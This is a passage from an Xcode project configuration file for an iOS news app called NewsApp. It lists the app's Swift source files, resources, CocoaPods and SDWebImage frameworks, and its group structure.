// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		33345D92E8948B65AFC1EA1B /* Pods_NewsApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D88ADE371A1DA52AD93E9339 /* Pods_NewsApp.framework */; };
		8E15454F2679AFBC00A71A73 /* CustomAlert.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E15454D2679AFBB00A71A73 /* CustomAlert.swift */; };
		8E154555267A180C00A71A73 /* CountryCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E154552267A180600A71A73 /* CountryCode.swift */; };
		8E154556267A180C00A71A73 /* CountryCodes.json in Resources */ = {isa = PBXBuildFile; fileRef = 8E154553267A180700A71A73 /* CountryCodes.json */; };
		8E154557267A180C00A71A73 /* flag-emojis.pretty.json in Resources */ = {isa = PBXBuildFile; fileRef = 8E154554267A180B00A71A73 /* flag-emojis.pretty.json */; };
		8E1973732677170D004C276E /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973722677170C004C276E /* NetworkManager.swift */; };
		8E19737626771731004C276E /* DataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E19737526771731004C276E /* DataManager.swift */; };
		8E1973B726776C23004C276E /* BaseVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973B626776C23004C276E /* BaseVC.swift */; };
		8E1973C626777DF7004C276E /* CountryDM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973C526777DF6004C276E /* CountryDM.swift */; };
		8E1973CA26777E1D004C276E /* SourcesDM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973C926777E1C004C276E /* SourcesDM.swift */; };
		8E1973CD26778329004C276E /* SourcesVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973CC26778329004C276E /* SourcesVM.swift */; };
		8E1973D2267783EB004C276E /* CountryVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973D1267783EB004C276E /* CountryVM.swift */; };
		8E1973D5267785D8004C276E /* NewsAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973D4267785D8004C276E /* NewsAPIService.swift */; };
		8E1973D8267785F6004C276E /* SourcesAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973D7267785F6004C276E /* SourcesAPIService.swift */; };
		8E1973DB26778609004C276E /* CountryAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973DA26778609004C276E /* CountryAPIService.swift */; };
		8E1F31FA2670A44800E58A86 /* SDWebImage.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8E1F31F92670A44800E58A86 /* SDWebImage.framework */; };
		8E90FE2E267B654800FD2F7D /* CustomAlert.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8E90FE2D267B654800FD2F7D /* CustomAlert.xib */; };
		8EADD40B2669D8E900E88249 /* NewsDM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E02669D8E900E88249 /* NewsDM.swift */; };
		8EADD40D2669D8E900E88249 /* SettingsList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E22669D8E900E88249 /* SettingsList.swift */; };
		8EADD40E2669D8E900E88249 /* CategoryList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E32669D8E900E88249 /* CategoryList.swift */; };
		8EADD4102669D8E900E88249 /* Settings.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E52669D8E900E88249 /* Settings.swift */; };
		8EADD4112669D8E900E88249 /* Category.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E62669D8E900E88249 /* Category.swift */; };
		8EADD4122669D8E900E88249 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD3E82669D8E900E88249 /* Assets.xcassets */; };
		8EADD4132669D8E900E88249 /* SearchTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3EA2669D8E900E88249 /* SearchTableViewController.swift */; };
		8EADD4142669D8E900E88249 /* BookMarksViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3EB2669D8E900E88249 /* BookMarksViewController.swift */; };
		8EADD4152669D8E900E88249 /* SourcesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3EC2669D8E900E88249 /* SourcesViewController.swift */; };
		8EADD4162669D8E900E88249 /* SelectCategoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3ED2669D8E900E88249 /* SelectCategoryViewController.swift */; };
		8EADD4172669D8E900E88249 /* TableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3EE2669D8E900E88249 /* TableViewCell.swift */; };
		8EADD4182669D8E900E88249 /* SelectCountryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3EF2669D8E900E88249 /* SelectCountryViewController.swift */; };
		8EADD4192669D8E900E88249 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F02669D8E900E88249 /* HomeViewController.swift */; };
		8EADD41A2669D8E900E88249 /* PreferencesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F12669D8E900E88249 /* PreferencesViewController.swift */; };
		8EADD41B2669D8E900E88249 /* TableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD3F22669D8E900E88249 /* TableViewCell.xib */; };
		8EADD41D2669D8E900E88249 /* LogInViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F42669D8E900E88249 /* LogInViewController.swift */; };
		8EADD41E2669D8E900E88249 /* TabBarViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F52669D8E900E88249 /* TabBarViewController.swift */; };
		8EADD41F2669D8E900E88249 /* LogoutViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F62669D8E900E88249 /* LogoutViewController.swift */; };
		8EADD4202669D8E900E88249 /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F72669D8E900E88249 /* SettingsViewController.swift */; };
		8EADD4212669D8E900E88249 /* SubscriptionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F82669D8E900E88249 /* SubscriptionViewController.swift */; };
		8EADD4222669D8E900E88249 /* FilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3F92669D8E900E88249 /* FilterViewController.swift */; };
		8EADD4232669D8E900E88249 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD3FB2669D8E900E88249 /* Preview Assets.xcassets */; };
		8EADD4242669D8E900E88249 /* NewsVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3FD2669D8E900E88249 /* NewsVM.swift */; };
		8EADD4252669D8E900E88249 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3FF2669D8E900E88249 /* AppDelegate.swift */; };
		8EADD4262669D8E900E88249 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD4002669D8E900E88249 /* SceneDelegate.swift */; };
		8EADD4272669D8E900E88249 /* Poppins-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4022669D8E900E88249 /* Poppins-Medium.ttf */; };
		8EADD4282669D8E900E88249 /* Poppins-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4032669D8E900E88249 /* Poppins-Regular.ttf */; };
		8EADD4292669D8E900E88249 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4042669D8E900E88249 /* Poppins-SemiBold.ttf */; };
		8EADD42A2669D8E900E88249 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4062669D8E900E88249 /* LaunchScreen.storyboard */; };
		8EADD42B2669D8E900E88249 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4082669D8E900E88249 /* Main.storyboard */; };
		8EDBF0CD266F5201008F9E61 /* LoadingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDBF0CC266F5201008F9E61 /* LoadingViewController.swift */; };
		8EDCE6022671C93200102931 /* UIColor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE6012671C93200102931 /* UIColor.swift */; };
		8EDCE6052671C96C00102931 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE6042671C96C00102931 /* UIView.swift */; };
		8EDCE6082671C99000102931 /* UITableView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE6072671C99000102931 /* UITableView.swift */; };
		8EDCE60C2671E4BA00102931 /* UIStatusBarStyle.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE60B2671E4BA00102931 /* UIStatusBarStyle.swift */; };
		8EDCE6102672207900102931 /* SelectCountry.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE60F2672207900102931 /* SelectCountry.swift */; };
		8EE3129926734B1A00185DE1 /* Selection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EE3129826734B1A00185DE1 /* Selection.swift */; };
		8EEE3CA3267870F0006CFC10 /* NewsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EEE3CA2267870F0006CFC10 /* NewsViewController.swift */; };
		8EEE3CA7267883E5006CFC10 /* APIKeys.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EEE3CA6267883E4006CFC10 /* APIKeys.swift */; };
		8EEE3CB12678A74E006CFC10 /* String.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EEE3CB02678A74E006CFC10 /* String.swift */; };
		8EEE3CB72678CEE3006CFC10 /* AppConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EEE3CB62678CEE3006CFC10 /* AppConstants.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		2159E23886C1D7427AF87AFC /* Pods-NewsApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NewsApp.release.xcconfig"; path = "Target Support Files/Pods-NewsApp/Pods-NewsApp.release.xcconfig"; sourceTree = "<group>"; };
		79E8AFB046D2CED80C7D0E53 /* Pods-NewsApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NewsApp.debug.xcconfig"; path = "Target Support Files/Pods-NewsApp/Pods-NewsApp.debug.xcconfig"; sourceTree = "<group>"; };
		8E15454D2679AFBB00A71A73 /* CustomAlert.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomAlert.swift; sourceTree = "<group>"; };
		8E154552267A180600A71A73 /* CountryCode.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = CountryCode.swift; path = ../../../../../Downloads/Vincet/Wasafiri/Wasafiri/Extensions/CountryCode.swift; sourceTree = "<group>"; };
		8E154553267A180700A71A73 /* CountryCodes.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; name = CountryCodes.json; path = ../../../../../Downloads/Vincet/Wasafiri/Wasafiri/Extensions/CountryCodes.json; sourceTree = "<group>"; };
		8E154554267A180B00A71A73 /* flag-emojis.pretty.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = "flag-emojis.pretty.json"; sourceTree = "<group>"; };
		8E1973722677170C004C276E /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
		8E19737526771731004C276E /* DataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataManager.swift; sourceTree = "<group>"; };
		8E1973B626776C23004C276E /* BaseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseVC.swift; sourceTree = "<group>"; };
		8E1973C526777DF6004C276E /* CountryDM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryDM.swift; sourceTree = "<group>"; };
		8E1973C926777E1C004C276E /* SourcesDM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourcesDM.swift; sourceTree = "<group>"; };
		8E1973CC26778329004C276E /* SourcesVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourcesVM.swift; sourceTree = "<group>"; };
		8E1973D1267783EB004C276E /* CountryVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryVM.swift; sourceTree = "<group>"; };
		8E1973D4267785D8004C276E /* NewsAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsAPIService.swift; sourceTree = "<group>"; };
		8E1973D7267785F6004C276E /* SourcesAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourcesAPIService.swift; sourceTree = "<group>"; };
		8E1973DA26778609004C276E /* CountryAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryAPIService.swift; sourceTree = "<group>"; };
		8E1F31EB2670A3E900E58A86 /* SDWebImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SDWebImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8E1F31F92670A44800E58A86 /* SDWebImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SDWebImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8E5566302670A0FC007399FB /* SDWebImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SDWebImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8E708DE0264CEB140055F518 /* NewsApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = NewsApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
		8E90FE2D267B654800FD2F7D /* CustomAlert.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CustomAlert.xib; sourceTree = "<group>"; };
		8EADD3E02669D8E900E88249 /* NewsDM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewsDM.swift; sourceTree = "<group>"; };
		8EADD3E22669D8E900E88249 /* SettingsList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SettingsList.swift; sourceTree = "<group>"; };
		8EADD3E32669D8E900E88249 /* CategoryList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CategoryList.swift; sourceTree = "<group>"; };
		8EADD3E52669D8E900E88249 /* Settings.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Settings.swift; sourceTree = "<group>"; };
		8EADD3E62669D8E900E88249 /* Category.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Category.swift; sourceTree = "<group>"; };
		8EADD3E72669D8E900E88249 /* NewsApp.entitlements */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.entitlements; path = NewsApp.entitlements; sourceTree = "<group>"; };
		8EADD3E82669D8E900E88249 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		8EADD3EA2669D8E900E88249 /* SearchTableViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SearchTableViewController.swift; sourceTree = "<group>"; };
		8EADD3EB2669D8E900E88249 /* BookMarksViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BookMarksViewController.swift; sourceTree = "<group>"; };
		8EADD3EC2669D8E900E88249 /* SourcesViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SourcesViewController.swift; sourceTree = "<group>"; };
		8EADD3ED2669D8E900E88249 /* SelectCategoryViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SelectCategoryViewController.swift; sourceTree = "<group>"; };
		8EADD3EE2669D8E900E88249 /* TableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TableViewCell.swift; sourceTree = "<group>"; };
		8EADD3EF2669D8E900E88249 /* SelectCountryViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SelectCountryViewController.swift; sourceTree = "<group>"; };
		8EADD3F02669D8E900E88249 /* HomeViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		8EADD3F12669D8E900E88249 /* PreferencesViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PreferencesViewController.swift; sourceTree = "<group>"; };
		8EADD3F22669D8E900E88249 /* TableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = TableViewCell.xib; sourceTree = "<group>"; };
		8EADD3F42669D8E900E88249 /* LogInViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LogInViewController.swift; sourceTree = "<group>"; };
		8EADD3F52669D8E900E88249 /* TabBarViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TabBarViewController.swift; sourceTree = "<group>"; };
		8EADD3F62669D8E900E88249 /* LogoutViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LogoutViewController.swift; sourceTree = "<group>"; };
		8EADD3F72669D8E900E88249 /* SettingsViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SettingsViewController.swift; sourceTree = "<group>"; };
		8EADD3F82669D8E900E88249 /* SubscriptionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SubscriptionViewController.swift; sourceTree = "<group>"; };
		8EADD3F92669D8E900E88249 /* FilterViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FilterViewController.swift; sourceTree = "<group>"; };
		8EADD3FB2669D8E900E88249 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		8EADD3FD2669D8E900E88249 /* NewsVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewsVM.swift; sourceTree = "<group>"; };
		8EADD3FF2669D8E900E88249 /* AppDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		8EADD4002669D8E900E88249 /* SceneDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		8EADD4022669D8E900E88249 /* Poppins-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Medium.ttf"; sourceTree = "<group>"; };
		8EADD4032669D8E900E88249 /* Poppins-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Regular.ttf"; sourceTree = "<group>"; };
		8EADD4042669D8E900E88249 /* Poppins-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-SemiBold.ttf"; sourceTree = "<group>"; };
		8EADD4072669D8E900E88249 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		8EADD4082669D8E900E88249 /* Main.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Main.storyboard; sourceTree = "<group>"; };
		8EADD4092669D8E900E88249 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		8EDBF0CC266F5201008F9E61 /* LoadingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingViewController.swift; sourceTree = "<group>"; };
		8EDCE6012671C93200102931 /* UIColor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIColor.swift; sourceTree = "<group>"; };
		8EDCE6042671C96C00102931 /* UIView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
		8EDCE6072671C99000102931 /* UITableView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UITableView.swift; sourceTree = "<group>"; };
		8EDCE60B2671E4BA00102931 /* UIStatusBarStyle.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIStatusBarStyle.swift; sourceTree = "<group>"; };
		8EDCE60F2672207900102931 /* SelectCountry.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCountry.swift; sourceTree = "<group>"; };
		8EE3129826734B1A00185DE1 /* Selection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Selection.swift; sourceTree = "<group>"; };
		8EEE3CA2267870F0006CFC10 /* NewsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsViewController.swift; sourceTree = "<group>"; };
		8EEE3CA6267883E4006CFC10 /* APIKeys.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIKeys.swift; sourceTree = "<group>"; };
		8EEE3CB02678A74E006CFC10 /* String.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = String.swift; sourceTree = "<group>"; };
		8EEE3CB62678CEE3006CFC10 /* AppConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConstants.swift; sourceTree = "<group>"; };
		D88ADE371A1DA52AD93E9339 /* Pods_NewsApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_NewsApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		8E708DDD264CEB140055F518 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8E1F31FA2670A44800E58A86 /* SDWebImage.framework in Frameworks */,
				33345D92E8948B65AFC1EA1B /* Pods_NewsApp.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		8E15454B2679AFBB00A71A73 /* Custom Alert */ = {
			isa = PBXGroup;
			children = (
				8E90FE2D267B654800FD2F7D /* CustomAlert.xib */,
				8E15454D2679AFBB00A71A73 /* CustomAlert.swift */,
			);
			path = "Custom Alert";
			sourceTree = "<group>";
		};
		8E197371267716C3004C276E /* Managers */ = {
			isa = PBXGroup;
			children = (
				8E1973722677170C004C276E /* NetworkManager.swift */,
				8E19737526771731004C276E /* DataManager.swift */,
			);
			path = Managers;
			sourceTree = "<group>";
		};
		8E1973B526776A89004C276E /* API Services */ = {
			isa = PBXGroup;
			children = (
				8E1973D4267785D8004C276E /* NewsAPIService.swift */,
				8E1973D7267785F6004C276E /* SourcesAPIService.swift */,
				8E1973DA26778609004C276E /* CountryAPIService.swift */,
			);
			path = "API Services";
			sourceTree = "<group>";
		};
		8E708DD7264CEB140055F518 = {
			isa = PBXGroup;
			children = (
				8EADD3DC2669D8E900E88249 /* NewsApp */,
				8E708DE1264CEB140055F518 /* Products */,
				BD53882A5360DD101773F6C0 /* Pods */,
				9F96F8BAE5884B1BD2AFFC3C /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		8E708DE1264CEB140055F518 /* Products */ = {
			isa = PBXGroup;
			children = (
				8E708DE0264CEB140055F518 /* NewsApp.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		8EADD3DC2669D8E900E88249 /* NewsApp */ = {
			isa = PBXGroup;
			children = (
				8EADD3E72669D8E900E88249 /* NewsApp.entitlements */,
				8EADD3DF2669D8E900E88249 /* News Data Models */,
				8EADD3FC2669D8E900E88249 /* News View Model */,
				8E197371267716C3004C276E /* Managers */,
				8E1973B526776A89004C276E /* API Services */,
				8EADD3E92669D8E900E88249 /* View Controllers */,
				8EADD4052669D8E900E88249 /* Views */,
				8EE3129726734AFE00185DE1 /* Constants */,
				8EDCE60E2672205F00102931 /* Delegates */,
				8EDBF0C5266F336F008F9E61 /* Extensions */,
				8EADD3FA2669D8E900E88249 /* Preview Content */,
				8EADD3FE2669D8E900E88249 /* Common */,
				8EADD4012669D8E900E88249 /* Fonts */,
				8EADD4092669D8E900E88249 /* Info.plist */,
			);
			path = NewsApp;
			sourceTree = "<group>";
		};
		8EADD3DF2669D8E900E88249 /* News Data Models */ = {
			isa = PBXGroup;
			children = (
				8EADD3E02669D8E900E88249 /* NewsDM.swift */,
				8EADD3E22669D8E900E88249 /* SettingsList.swift */,
				8EADD3E32669D8E900E88249 /* CategoryList.swift */,
				8EADD3E52669D8E900E88249 /* Settings.swift */,
				8EADD3E62669D8E900E88249 /* Category.swift */,
				8E1973C526777DF6004C276E /* CountryDM.swift */,
				8E1973C926777E1C004C276E /* SourcesDM.swift */,
			);
			path = "News Data Models";
			sourceTree = "<group>";
		};
		8EADD3E92669D8E900E88249 /* View Controllers */ = {
			isa = PBXGroup;
			children = (
				8EADD3EA2669D8E900E88249 /* SearchTableViewController.swift */,
				8EADD3EB2669D8E900E88249 /* BookMarksViewController.swift */,
				8EADD3EC2669D8E900E88249 /* SourcesViewController.swift */,
				8EADD3ED2669D8E900E88249 /* SelectCategoryViewController.swift */,
				8EADD3EE2669D8E900E88249 /* TableViewCell.swift */,
				8EADD3EF2669D8E900E88249 /* SelectCountryViewController.swift */,
				8EADD3F02669D8E900E88249 /* HomeViewController.swift */,
				8EADD3F12669D8E900E88249 /* PreferencesViewController.swift */,
				8EADD3F22669D8E900E88249 /* TableViewCell.xib */,
				8EADD3F42669D8E900E88249 /* LogInViewController.swift */,
				8EADD3F52669D8E900E88249 /* TabBarViewController.swift */,
				8EADD3F62669D8E900E88249 /* LogoutViewController.swift */,
				8EADD3F72669D8E900E88249 /* SettingsViewController.swift */,
				8EADD3F82669D8E900E88249 /* SubscriptionViewController.swift */,
				8EADD3F92669D8E900E88249 /* FilterViewController.swift */,
				8EDBF0CC266F5201008F9E61 /* LoadingViewController.swift */,
				8EEE3CA2267870F0006CFC10 /* NewsViewController.swift */,
			);
			path = "View Controllers";
			sourceTree = "<group>";
		};
		8EADD3FA2669D8E900E88249 /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				8EADD3FB2669D8E900E88249 /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		8EADD3FC2669D8E900E88249 /* News View Model */ = {
			isa = PBXGroup;
			children = (
				8EADD3FD2669D8E900E88249 /* NewsVM.swift */,
				8E1973CC26778329004C276E /* SourcesVM.swift */,
				8E1973D1267783EB004C276E /* CountryVM.swift */,
			);
			path = "News View Model";
			sourceTree = "<group>";
		};
		8EADD3FE2669D8E900E88249 /* Common */ = {
			isa = PBXGroup;
			children = (
				8E15454B2679AFBB00A71A73 /* Custom Alert */,
				8EADD3E82669D8E900E88249 /* Assets.xcassets */,
				8EADD3FF2669D8E900E88249 /* AppDelegate.swift */,
				8EADD4002669D8E900E88249 /* SceneDelegate.swift */,
				8E1973B626776C23004C276E /* BaseVC.swift */,
			);
			path = Common;
			sourceTree = "<group>";
		};
		8EADD4012669D8E900E88249 /* Fonts */ = {
			isa = PBXGroup;
			children = (
				8EADD4022669D8E900E88249 /* Poppins-Medium.ttf */,
				8EADD4032669D8E900E88249 /* Poppins-Regular.ttf */,
				8EADD4042669D8E900E88249 /* Poppins-SemiBold.ttf */,
			);
			path = Fonts;
			sourceTree = "<group>";
		};
		8EADD4052669D8E900E88249 /* Views */ = {
			isa = PBXGroup;
			children = (
				8EADD4062669D8E900E88249 /* LaunchScreen.storyboard */,
				8EADD4082669D8E900E88249 /* Main.storyboard */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		8EDBF0C5266F336F008F9E61 /* Extensions */ = {
			isa = PBXGroup;
			children = (
				8E154552267A180600A71A73 /* CountryCode.swift */,
				8E154553267A180700A71A73 /* CountryCodes.json */,
				8E154554267A180B00A71A73 /* flag-emojis.pretty.json */,
				8EDCE6012671C93200102931 /* UIColor.swift */,
				8EDCE6042671C96C00102931 /* UIView.swift */,
				8EDCE6072671C99000102931 /* UITableView.swift */,
				8EDCE60B2671E4BA00102931 /* UIStatusBarStyle.swift */,
				8EEE3CB02678A74E006CFC10 /* String.swift */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		8EDCE60E2672205F00102931 /* Delegates */ = {
			isa = PBXGroup;
			children = (
				8EDCE60F2672207900102931 /* SelectCountry.swift */,
			);
			path = Delegates;
			sourceTree = "<group>";
		};
		8EE3129726734AFE00185DE1 /* Constants */ = {
			isa = PBXGroup;
			children = (
				8EEE3CA6267883E4006CFC10 /* APIKeys.swift */,
				8EE3129826734B1A00185DE1 /* Selection.swift */,
				8EEE3CB62678CEE3006CFC10 /* AppConstants.swift */,
			);
			path = Constants;
			sourceTree = "<group>";
		};
		9F96F8BAE5884B1BD2AFFC3C /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				8E1F31F92670A44800E58A86 /* SDWebImage.framework */,
				8E1F31EB2670A3E900E58A86 /* SDWebImage.framework */,
				8E5566302670A0FC007399FB /* SDWebImage.framework */,
